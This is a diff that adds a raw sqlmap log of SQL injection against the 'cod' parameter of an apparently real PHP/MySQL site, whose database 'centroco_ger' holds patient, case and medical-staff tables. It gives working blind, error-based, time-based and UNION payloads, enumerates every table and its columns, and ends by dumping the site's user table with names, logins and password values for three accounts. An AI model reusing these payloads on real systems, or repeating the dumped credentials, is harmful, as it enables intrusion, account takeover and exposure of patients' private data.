@@ -1,0 +1,674 @@
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=23 AND 4644=4644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=23 AND (SELECT 5512 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(5512=5512,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=23 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cod=-8579 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6a71,0x63424352637a45537269726f7277544b62557673724a6b534c6c424a4e6f4c4358716f4d4a5a6954,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfVR
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] centroco_ger
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=23 AND 4644=4644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=23 AND (SELECT 5512 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(5512=5512,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=23 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cod=-8579 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6a71,0x63424352637a45537269726f7277544b62557673724a6b534c6c424a4e6f4c4358716f4d4a5a6954,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfVR
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: centroco_ger
+[23 tables]
++-----------------------+
+| t_artigos             |
+| t_casos               |
+| t_casos_acompanhar    |
+| t_casos_comentarios   |
+| t_casos_participantes |
+| t_corpo               |
+| t_corpo_parceiros     |
+| t_downloads           |
+| t_estados             |
+| t_eventos             |
+| t_faq                 |
+| t_gal_imagem          |
+| t_galeria             |
+| t_google              |
+| t_grupo_faq           |
+| t_grupo_noticia       |
+| t_menu                |
+| t_noticias            |
+| t_pacientes           |
+| t_permissoes          |
+| t_procedimentos       |
+| t_status              |
+| t_user                |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=23 AND 4644=4644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=23 AND (SELECT 5512 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(5512=5512,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=23 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cod=-8579 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6a71,0x63424352637a45537269726f7277544b62557673724a6b534c6c424a4e6f4c4358716f4d4a5a6954,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfVR
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: centroco_ger
+[23 tables]
++-----------------------+
+| t_artigos             |
+| t_casos               |
+| t_casos_acompanhar    |
+| t_casos_comentarios   |
+| t_casos_participantes |
+| t_corpo               |
+| t_corpo_parceiros     |
+| t_downloads           |
+| t_estados             |
+| t_eventos             |
+| t_faq                 |
+| t_gal_imagem          |
+| t_galeria             |
+| t_google              |
+| t_grupo_faq           |
+| t_grupo_noticia       |
+| t_menu                |
+| t_noticias            |
+| t_pacientes           |
+| t_permissoes          |
+| t_procedimentos       |
+| t_status              |
+| t_user                |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=23 AND 4644=4644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=23 AND (SELECT 5512 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(5512=5512,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=23 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cod=-8579 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6a71,0x63424352637a45537269726f7277544b62557673724a6b534c6c424a4e6f4c4358716f4d4a5a6954,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfVR
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: centroco_ger
+[23 tables]
++-----------------------+
+| t_artigos             |
+| t_casos               |
+| t_casos_acompanhar    |
+| t_casos_comentarios   |
+| t_casos_participantes |
+| t_corpo               |
+| t_corpo_parceiros     |
+| t_downloads           |
+| t_estados             |
+| t_eventos             |
+| t_faq                 |
+| t_gal_imagem          |
+| t_galeria             |
+| t_google              |
+| t_grupo_faq           |
+| t_grupo_noticia       |
+| t_menu                |
+| t_noticias            |
+| t_pacientes           |
+| t_permissoes          |
+| t_procedimentos       |
+| t_status              |
+| t_user                |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=23 AND 4644=4644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=23 AND (SELECT 5512 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(5512=5512,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=23 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cod=-8579 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6a71,0x63424352637a45537269726f7277544b62557673724a6b534c6c424a4e6f4c4358716f4d4a5a6954,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfVR
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: centroco_ger
+[23 tables]
++-----------------------+
+| t_artigos             |
+| t_casos               |
+| t_casos_acompanhar    |
+| t_casos_comentarios   |
+| t_casos_participantes |
+| t_corpo               |
+| t_corpo_parceiros     |
+| t_downloads           |
+| t_estados             |
+| t_eventos             |
+| t_faq                 |
+| t_gal_imagem          |
+| t_galeria             |
+| t_google              |
+| t_grupo_faq           |
+| t_grupo_noticia       |
+| t_menu                |
+| t_noticias            |
+| t_pacientes           |
+| t_permissoes          |
+| t_procedimentos       |
+| t_status              |
+| t_user                |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=23 AND 4644=4644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=23 AND (SELECT 5512 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(5512=5512,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=23 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cod=-8579 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6a71,0x63424352637a45537269726f7277544b62557673724a6b534c6c424a4e6f4c4358716f4d4a5a6954,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfVR
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: centroco_ger
+[23 tables]
++-----------------------+
+| t_artigos             |
+| t_casos               |
+| t_casos_acompanhar    |
+| t_casos_comentarios   |
+| t_casos_participantes |
+| t_corpo               |
+| t_corpo_parceiros     |
+| t_downloads           |
+| t_estados             |
+| t_eventos             |
+| t_faq                 |
+| t_gal_imagem          |
+| t_galeria             |
+| t_google              |
+| t_grupo_faq           |
+| t_grupo_noticia       |
+| t_menu                |
+| t_noticias            |
+| t_pacientes           |
+| t_permissoes          |
+| t_procedimentos       |
+| t_status              |
+| t_user                |
++-----------------------+
+
+Database: centroco_ger
+Table: t_gal_imagem
+[9 columns]
++----------------+------------------+
+| Column         | Type             |
++----------------+------------------+
+| gal_cod        | int(10) unsigned |
+| gal_img_cod    | int(10) unsigned |
+| gal_img_foto   | longblob         |
+| gal_img_height | int(11)          |
+| gal_img_nome   | varchar(255)     |
+| gal_img_tipo   | varchar(45)      |
+| gal_img_width  | int(11)          |
+| gal_legenda    | varchar(255)     |
+| user_cod       | int(11)          |
++----------------+------------------+
+
+Database: centroco_ger
+Table: t_procedimentos
+[4 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| proc_ativo | varchar(1)   |
+| proc_cod   | int(11)      |
+| proc_nome  | varchar(250) |
+| user_cod   | int(11)      |
++------------+--------------+
+
+Database: centroco_ger
+Table: t_galeria
+[3 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| gal_cod  | int(10) unsigned |
+| gal_nome | varchar(255)     |
+| user_cod | int(11)          |
++----------+------------------+
+
+Database: centroco_ger
+Table: t_grupo_faq
+[2 columns]
++---------------+------------------+
+| Column        | Type             |
++---------------+------------------+
+| grufaq_codigo | int(10) unsigned |
+| grufaq_nome   | varchar(70)      |
++---------------+------------------+
+
+Database: centroco_ger
+Table: t_artigos
+[12 columns]
++---------------------+------------------+
+| Column              | Type             |
++---------------------+------------------+
+| arq_arquivo         | longblob         |
+| arq_nome            | varchar(50)      |
+| arq_tipo            | varchar(50)      |
+| art_assunto         | varchar(255)     |
+| art_ativo           | varchar(1)       |
+| art_cod             | int(10) unsigned |
+| art_data            | date             |
+| art_data_publicacao | date             |
+| art_ordem           | varchar(11)      |
+| art_sumario         | longtext         |
+| art_titulo          | varchar(250)     |
+| user_cod            | int(11)          |
++---------------------+------------------+
+
+Database: centroco_ger
+Table: t_casos
+[27 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| arq_1_arquivo  | longblob     |
+| arq_1_nome     | varchar(255) |
+| arq_1_tipo     | varchar(50)  |
+| arq_2_arquivo  | longblob     |
+| arq_2_nome     | varchar(255) |
+| arq_2_tipo     | varchar(50)  |
+| arq_3_arquivo  | longblob     |
+| arq_3_nome     | varchar(255) |
+| arq_3_tipo     | varchar(50)  |
+| arq_4_arquivo  | longblob     |
+| arq_4_nome     | varchar(255) |
+| arq_4_tipo     | varchar(50)  |
+| arq_5_arquivo  | longblob     |
+| arq_5_nome     | varchar(255) |
+| arq_5_tipo     | varchar(50)  |
+| arq_6_arquivo  | longblob     |
+| arq_6_nome     | varchar(255) |
+| arq_6_tipo     | varchar(50)  |
+| caso_assunto   | varchar(255) |
+| caso_ativo     | varchar(1)   |
+| caso_cod       | int(11)      |
+| caso_desc      | longtext     |
+| caso_dt_fim    | date         |
+| caso_dt_inicio | date         |
+| caso_titulo    | varchar(250) |
+| part_cod       | int(11)      |
+| user_cod       | int(11)      |
++----------------+--------------+
+
+Database: centroco_ger
+Table: t_user
+[6 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| user_avatar | blob         |
+| user_cod    | int(11)      |
+| user_codigo | int(11)      |
+| user_login  | varchar(20)  |
+| user_nome   | varchar(100) |
+| user_pass   | varchar(20)  |
++-------------+--------------+
+
+Database: centroco_ger
+Table: t_corpo
+[9 columns]
++---------------+------------------+
+| Column        | Type             |
++---------------+------------------+
+| corpo_ativo   | varchar(1)       |
+| corpo_cod     | int(10) unsigned |
+| corpo_crm     | varchar(50)      |
+| corpo_desc    | longtext         |
+| corpo_lates   | varchar(250)     |
+| corpo_nome    | varchar(250)     |
+| corpo_ordem   | varchar(11)      |
+| corpo_servico | longtext         |
+| user_cod      | int(11)          |
++---------------+------------------+
+
+Database: centroco_ger
+Table: t_menu
+[3 columns]
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| menu_link | varchar(255)     |
+| menu_nome | varchar(255)     |
+| nivel_cod | int(10) unsigned |
++-----------+------------------+
+
+Database: centroco_ger
+Table: t_eventos
+[6 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| even_cod      | int(11)      |
+| even_data     | date         |
+| even_datadesc | varchar(250) |
+| even_desc     | longtext     |
+| even_nome     | varchar(250) |
+| user_cod      | int(11)      |
++---------------+--------------+
+
+Database: centroco_ger
+Table: t_estados
+[3 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| est_cod   | int(10)     |
+| est_nome  | varchar(72) |
+| est_sigla | char(2)     |
++-----------+-------------+
+
+Database: centroco_ger
+Table: t_noticias
+[13 columns]
++---------------------+------------------+
+| Column              | Type             |
++---------------------+------------------+
+| grunot_codigo       | int(11)          |
+| noticias_ativo      | varchar(1)       |
+| noticias_cod        | int(10) unsigned |
+| noticias_data       | datetime         |
+| noticias_desc       | longtext         |
+| noticias_destaque   | char(2)          |
+| noticias_fonte      | varchar(250)     |
+| noticias_gravata    | longtext         |
+| noticias_img_imagem | longblob         |
+| noticias_img_nome   | varchar(30)      |
+| noticias_img_tipo   | varchar(25)      |
+| noticias_titulo     | varchar(250)     |
+| user_cod            | int(11)          |
++---------------------+------------------+
+
+Database: centroco_ger
+Table: t_pacientes
+[7 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| pac_ativo | varchar(1)   |
+| pac_cod   | int(11)      |
+| pac_email | varchar(250) |
+| pac_login | varchar(250) |
+| pac_nome  | varchar(250) |
+| pac_senha | varchar(250) |
+| user_cod  | int(11)      |
++-----------+--------------+
+
+Database: centroco_ger
+Table: t_casos_acompanhar
+[2 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| caso_cod | int(11) |
+| part_cod | int(11) |
++----------+---------+
+
+Database: centroco_ger
+Table: t_casos_comentarios
+[7 columns]
++-----------+------------+
+| Column    | Type       |
++-----------+------------+
+| caso_cod  | int(11)    |
+| com_ativo | varchar(1) |
+| com_cod   | int(11)    |
+| com_data  | date       |
+| com_desc  | longtext   |
+| part_cod  | int(11)    |
+| user_cod  | int(11)    |
++-----------+------------+
+
+Database: centroco_ger
+Table: t_grupo_noticia
+[2 columns]
++---------------+------------------+
+| Column        | Type             |
++---------------+------------------+
+| grunot_codigo | int(10) unsigned |
+| grunot_nome   | varchar(70)      |
++---------------+------------------+
+
+Database: centroco_ger
+Table: t_permissoes
+[2 columns]
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| nivel_cod | int(10) unsigned |
+| user_cod  | int(11) unsigned |
++-----------+------------------+
+
+Database: centroco_ger
+Table: t_casos_participantes
+[9 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| part_ativo   | varchar(1)   |
+| part_cidade  | varchar(250) |
+| part_cod     | int(11)      |
+| part_dt_nasc | date         |
+| part_email   | varchar(250) |
+| part_nome    | varchar(250) |
+| part_senha   | varchar(255) |
+| part_servico | varchar(1)   |
+| user_cod     | int(11)      |
++--------------+--------------+
+
+Database: centroco_ger
+Table: t_status
+[6 columns]
++--------------+------------------+
+| Column       | Type             |
++--------------+------------------+
+| pac_cod      | int(11)          |
+| status_ativo | char(1)          |
+| status_cod   | int(10) unsigned |
+| status_data  | date             |
+| status_desc  | longtext         |
+| user_cod     | int(11)          |
++--------------+------------------+
+
+Database: centroco_ger
+Table: t_google
+[5 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| go_cod     | int(11)      |
+| go_end     | varchar(255) |
+| go_senha   | varchar(50)  |
+| go_usuario | varchar(250) |
+| user_cod   | int(11)      |
++------------+--------------+
+
+Database: centroco_ger
+Table: t_corpo_parceiros
+[7 columns]
++---------------------+------------------+
+| Column              | Type             |
++---------------------+------------------+
+| corpo_ativo         | varchar(1)       |
+| corpo_cod           | int(10) unsigned |
+| corpo_crm           | varchar(50)      |
+| corpo_especialidade | varchar(255)     |
+| corpo_nome          | varchar(250)     |
+| corpo_ordem         | varchar(11)      |
+| user_cod            | int(11)          |
++---------------------+------------------+
+
+Database: centroco_ger
+Table: t_downloads
+[9 columns]
++-------------+------------------+
+| Column      | Type             |
++-------------+------------------+
+| arq_arquivo | longblob         |
+| arq_ativo   | char(1)          |
+| arq_cod     | int(10) unsigned |
+| arq_data    | date             |
+| arq_nome    | varchar(250)     |
+| arq_tipo    | varchar(50)      |
+| pac_cod     | int(11)          |
+| proc_cod    | int(11)          |
+| user_cod    | int(11)          |
++-------------+------------------+
+
+Database: centroco_ger
+Table: t_faq
+[7 columns]
++------------+------------------+
+| Column     | Type             |
++------------+------------------+
+| faq_ativo  | varchar(1)       |
+| faq_cod    | int(10) unsigned |
+| faq_data   | datetime         |
+| faq_desc   | longtext         |
+| faq_ordem  | varchar(10)      |
+| faq_titulo | varchar(250)     |
+| user_cod   | int(11)          |
++------------+------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=23 AND 4644=4644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=23 AND (SELECT 5512 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(5512=5512,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=23 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cod=-8579 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6a71,0x63424352637a45537269726f7277544b62557673724a6b534c6c424a4e6f4c4358716f4d4a5a6954,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfVR
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: centroco_ger
+Table: t_user
+[3 entries]
++----------+--------------+---------------+------------+-------------+-------------+
+| user_cod | user_nome    | user_pass     | user_login | user_avatar | user_codigo |
++----------+--------------+---------------+------------+-------------+-------------+
+| 1        | hidea-carlos | 81cCwfqX2Mltg | carlos     | <blank>     | 1           |
+| 2        | hidea-cris   | 34z0oc.tLSrHY | crissussai | NULL        | 1           |
+| 5        | Fábio Selig  | 19r1KLIRCu29o | fabio      | NULL        | 2           |
++----------+--------------+---------------+------------+-------------+-------------+
+
